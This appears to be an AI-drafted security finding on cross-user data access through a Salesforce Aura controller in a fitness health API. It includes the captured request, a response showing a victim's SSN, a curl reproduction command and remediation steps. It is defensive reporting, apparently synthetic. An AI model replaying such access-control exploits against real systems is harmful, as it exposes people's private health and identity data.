# Security Analysis Report
**System:** VitalTrack Health API (Fitness / Wearables) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0031 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.1 | Functional pivot — `TaskController.getTask` exploited to access cross-user health biometric task records |

---

## Finding 1 — Functional Pivot: Cross-User Fitness Health Task Data Access (CRITICAL)

### Summary
The `TaskController` Apex class on VitalTrack Health API (`64d9c438.lightning.force.com`) is declared `without sharing`. Per §5.0 Pattern 2.1, the `getTask` action enables a functional pivot: the attacker pivots from their normal function (retrieving their own health tracking tasks) to accessing another user's biometric health task record by substituting `taskId: "001C438"`. Health wearable task records contain workout data, biometric measurements, and health monitoring configurations.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://64d9c438.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://64d9c438.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D64D9C438!AR64d9c438...
message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","params":{"taskId":"001C438","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response:** `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-42-8903`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §5.0 Pattern 2.1 | Vulnerability | Functional pivot — task read cross-user | Classification |
| HAR descriptor | `c.TaskController.getTask` | Aura action | Entry point |
| HAR params | `taskId` | `001C438` | Victim health task record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-42-8903` | Health biometric PII |

### Steps to Reproduce
```bash
curl -s -X POST "https://64d9c438.lightning.force.com/aura" \
  -H "Authorization: Bearer 00D64D9C438!AR64d9c438..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001C438","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class TaskController {`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields`; server-side allowlist.
4. Validate `aura.token`. Health wearable biometric data is PHI under HIPAA if identifiable.
